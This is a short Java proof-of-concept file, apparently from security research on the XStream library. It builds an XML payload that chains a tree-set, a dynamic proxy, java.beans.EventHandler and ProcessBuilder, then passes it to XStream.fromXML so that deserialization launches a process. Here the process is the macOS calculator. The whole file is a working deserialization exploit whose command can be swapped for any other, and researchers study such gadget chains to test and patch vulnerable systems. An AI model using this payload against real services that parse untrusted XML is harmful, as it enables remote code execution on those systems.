package com.trganda.xstream.treeset;

import com.thoughtworks.xstream.XStream;

public class XStreamTreeSetExec {
    public static void main(String[] args) {
        String from =
                "<tree-set>\n"
                        + "    <dynamic-proxy>\n"
                        + "    <interface>java.lang.Comparable</interface>\n"
                        + "    <handler class=\"java.beans.EventHandler\">\n"
                        + "        <target class=\"java.lang.ProcessBuilder\">\n"
                        + "            <command>\n"
                        + "                <string>open</string>\n"
                        + "                <string>-a</string>\n"
                        + "                <string>calculator</string>\n"
                        + "            </command>\n"
                        + "        </target>\n"
                        + "        <action>start</action>\n"
                        + "    </handler>\n"
                        + "    </dynamic-proxy>\n"
                        + "</tree-set>";

        new XStream().fromXML(from);
    }
}
